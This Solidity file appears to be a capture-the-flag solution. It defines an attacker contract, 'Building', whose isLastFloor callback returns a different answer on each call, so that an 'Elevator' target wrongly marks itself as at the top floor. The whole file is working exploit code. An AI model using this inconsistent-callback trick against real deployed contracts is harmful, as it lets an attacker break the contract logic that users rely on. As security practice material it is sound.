// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract Building{
    Elevator public target;
    bool public top = false;
    
    constructor(address _target){
        target = Elevator(_target);
    }

    function attack() external{
        target.goTo(1);
    }

    function isLastFloor(uint256 _floor) external returns (bool){
        top = !top;
        return !top;
    }
}